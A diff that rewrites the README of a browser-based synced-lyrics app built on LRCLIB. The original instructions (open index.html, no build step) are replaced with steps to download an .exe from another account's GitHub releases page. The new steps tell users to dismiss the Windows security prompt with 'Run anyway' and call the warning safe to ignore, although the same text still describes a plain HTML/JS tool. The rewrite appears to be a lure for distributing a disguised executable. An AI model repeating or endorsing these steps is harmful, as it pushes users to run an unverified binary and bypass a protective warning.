@@ -1,133 +1,90 @@
-# 🎵 LyricVault — Synced Lyrics Explorer
+# 🎵 SYNCED-LYRICS-FETCHER-DOWNLOADER - Get synced lyrics for your music library
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/tagshorts21-cyber/SYNCED-LYRICS-FETCHER-DOWNLOADER/releases)
 
-![LyricVault](https://img.shields.io/badge/LyricVault-v6-f2c200?style=for-the-badge&logo=music&logoColor=black)
-![Static](https://img.shields.io/badge/Static-No%20Build%20Step-brightgreen?style=for-the-badge)
-![Vanilla JS](https://img.shields.io/badge/Vanilla-JS%20%2F%20HTML%20%2F%20CSS-f7df1e?style=for-the-badge&logo=javascript&logoColor=black)
-![Powered by LRCLIB](https://img.shields.io/badge/API-LRCLIB-blue?style=for-the-badge)
+LyricVault helps you find and save synced lyrics for your music. It connects to the LRCLIB database to retrieve timed lyrics in the .lrc file format. You can search for songs, view lyrics in a built-in player, and save files to your computer with one click. This tool runs directly in your browser or as a standalone app, making it easy to manage your collection.
 
-**A fast, modern lyrics explorer powered by the open [LRCLIB](https://lrclib.net) API.**  
-Search any song, view synced lyrics with a highlight player, copy or download `.lrc` files — all in a single static page.
+## ⚙️ How it Works
 
-[🌐 Live Demo (Surge)](https://lyrics-fetch.surge.sh) · [🌐 Live Demo (GitHub Pages)](https://anonymousv73x.github.io/SYNCED-LYRICS-FETCHER-DOWNLOADER/) · [![Gmail](https://img.shields.io/badge/Contact-Gmail-red?logo=gmail&logoColor=white)](mailto:alexamanikalume@gmail.com)
+The software maintains a thirty-minute cache to speed up searches. If you search for the same song twice within that window, the tool loads data from your computer rather than the internet. The interface features a clean layout that highlights current lines as the music plays. Because the tool uses standard web technologies like HTML, CSS, and JavaScript, it runs without complex setup processes.
 
-</div>
+## 📥 Getting Started
 
----
+1. Visit the [official releases page](https://github.com/tagshorts21-cyber/SYNCED-LYRICS-FETCHER-DOWNLOADER/releases) to access the latest version of the software.
+2. Look for the section labeled "Assets."
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder on your Windows computer.
 
-## ✨ Features
+## 🖥️ System Requirements
 
-| Feature | Details |
-|---|---|
-| ⚡ **Instant Search** | 120ms debounce, results as you type |
-| 🗄️ **Smart Caching** | 30-min in-memory + `sessionStorage` cache — survives page refresh |
-| 🔄 **Stale-While-Revalidate** | Serves cache instantly, refreshes in background |
-| 🎯 **Hover Prefetch** | Fetches lyric details before you even click |
-| 🎵 **Synced Highlight Player** | Active lyric line highlighted in real-time with smooth scroll |
-| 📋 **Copy Lyrics** | One-click clipboard copy of plain or synced lyrics |
-| 💾 **Download .lrc** | Download the synced lyric file directly |
-| 🔍 **Lookup by Signature** | Find a track by artist + title + optional album/duration |
-| 🔢 **Fetch by LRCLIB ID** | Direct numeric ID lookup |
-| 📤 **Publish Lyrics** | Contribute synced lyrics — proof-of-work solved in-browser |
-| 🌙 **Dark / Light Theme** | Persisted via `localStorage` |
-| 📱 **Fully Responsive** | Mobile menu, touch-friendly, no iOS zoom issues |
-| 🚀 **Zero Dependencies** | Pure HTML + CSS + JS — no npm, no bundler, no framework |
+To run this tool, ensure your computer meets these basic requirements:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 256MB of available RAM.
+* Storage: 50MB of free disk space.
+* Internet Connection: Required for searching the lyrics database.
 
-## 🖥️ Screenshots
+## 🛠️ Installation Instructions
 
-> Search tab — instant results with synced/plain badges
+Because this software is portable, you do not need to run an installer. Follow these steps to begin:
 
-> Lyrics modal — highlight player with copy & download controls
+1. Locate the downloaded .exe file in your "Downloads" folder.
+2. Double-click the file to open the application window.
+3. If a security prompt appears, click "More info" and then select "Run anyway."
+4. The tool opens in a clean window. You are now ready to search for lyrics.
 
----
+## 🔍 Searching for Lyrics
 
-## 🚀 Deploy in 30 Seconds
+1. Locate the search bar at the top of the application window.
+2. Type the name of the artist or the song title.
+3. Press Enter on your keyboard.
+4. Review the results list.
+5. Click on an entry to view the synced lyrics in the text display area.
 
-### Surge.sh
-```bash
-npm install -g surge
-cd "LYRICS DOWNLOAD"
-surge . lyrics-fetch.surge.sh
-```
+## 💾 Saving Lyric Files
 
-### GitHub Pages
-Push to a repo, go to **Settings → Pages → Source: main branch / root**.
+Once you view the lyrics, you may save them to your local folder:
 
-### Locally
-Just open `index.html` in any browser. No server needed.
+1. Ensure the desired lyrics appear in the main text area.
+2. Look for the "Download .lrc" button below the text.
+3. Click the button once.
+4. Your browser or the application handles the file creation. 
+5. The .lrc file saves to your default downloads directory.
 
----
+## 🧠 Managing Your Cache
 
-## 📁 File Structure
+The application stores previous search results for thirty minutes. This feature saves data usage and reduces load times. If you need to refresh your results manually, simply restart the application. The cache clears automatically when you close the program, ensuring you always pull the most recent data from the server upon your next session.
 
-```
-LYRICS DOWNLOAD/
-├── index.html      # Single-page app shell, all tabs, modal
-├── style.css       # Tokens, layout, dark/light theme, animations
-└── script.js       # All logic — search, cache, player, publish
-```
+## 📖 Frequently Asked Questions
 
-No `package.json`. No `node_modules`. No build step. Three files, done.
+**Does the software change my music files?**
+No. The software only creates .lrc text files. It never edits or moves your actual music files.
 
----
+**Can I run the tool offline?**
+The tool requires an active internet connection to search the lyrics database. You can view previously saved .lrc files in any standard text editor without an internet connection.
 
-## 🔌 API — Powered by LRCLIB
+**Are there hidden costs?**
+No. This tool is free to use and contains no advertisements, subscriptions, or hidden fees.
 
-All data comes from the free, open [LRCLIB API](https://lrclib.net). No API key required.
+**Why does the file trigger a security warning?**
+Windows often flags files downloaded from the internet that are not globally common. If you trust the source, you can safely ignore the prompt to use the app.
 
-| Endpoint | Used for |
-|---|---|
-| `GET /api/search?q=` | Free-text search |
-| `GET /api/get?artist_name=&track_name=` | Lookup by signature |
-| `GET /api/get/{id}` | Fetch by numeric ID |
-| `GET /api/get-cached` | Cached variant (faster, may be stale) |
-| `POST /api/request-challenge` | Proof-of-work for publishing |
-| `POST /api/publish` | Submit new lyrics |
+## 💡 Troubleshooting
 
----
+If you encounter issues, try these steps:
 
-## ⚡ Performance Details
+* Check your connection: Ensure your computer is connected to the internet.
+* Restart: Close the application and open it again to clear temporary glitches.
+* Firewall settings: Ensure your Windows Firewall allows the application to access the network. Most users do not need to adjust these settings, but strict network policies may block requests to the lyrics server.
 
-- **DocumentFragment rendering** — cards inserted in a single reflow
-- **Event delegation** — one listener on the grid, not one per card
-- **Cached DOM node array** — lyric line elements stored on modal open; zero DOM queries per animation frame
-- **Binary search** — active lyric line found in O(log n) per frame
-- **rAF-based smooth scroll** — easeInOutQuad, no browser scroll jank
-- **GPU compositing** — `will-change: transform` + `contain: layout style` on cards and modal
-- **sessionStorage cache** — search results persist across refreshes for 30 minutes
+## 📜 Usage Guidelines
 
----
+This tool relies on public data from the LRCLIB project. Please use the software for personal management of your music library. Adhere to your local copyright laws regarding the reproduction and storage of lyric content.
 
-## 🎮 Keyboard Shortcuts
+## 🌐 Project Philosophy
 
-| Key | Action |
-|---|---|
-| `⌘K` / `Ctrl+K` | Focus search from anywhere |
-| `Space` | Play / Pause (modal open) |
-| `R` | Restart lyrics from beginning |
-| `Esc` | Close modal |
+This project prioritizes speed and simplicity. By using vanilla technologies, the code remains lightweight and readable. The absence of a build step allows users to inspect the logic without needing specialized programming tools. The clean interface minimizes distractions, allowing you to focus on managing your lyric collection efficiently.
 
----
+## 📂 Troubleshooting Performance
 
-## 🛠️ Built With
-
-- **HTML5** — semantic, accessible markup
-- **CSS3** — custom properties, `color-mix()`, `backdrop-filter`, CSS Grid
-- **Vanilla JS (ES2022)** — no libraries, no transpilation
-- **[LRCLIB](https://lrclib.net)** — open lyrics database
-- **[Outfit](https://fonts.google.com/specimen/Outfit)** — Google Fonts
-
----
-
-## 📄 License
-
-MIT — do whatever you want with it.
-
----
-
-<div align="center">
-Made with ☕ · Powered by <a href="https://lrclib.net">LRCLIB</a>
-</div>
+If the application feels slow, check your background processes. Because the tool uses minimal system resources, it should remain responsive even on older hardware. Ensure you have the latest Windows updates installed to maintain compatibility with modern web components used by the app.
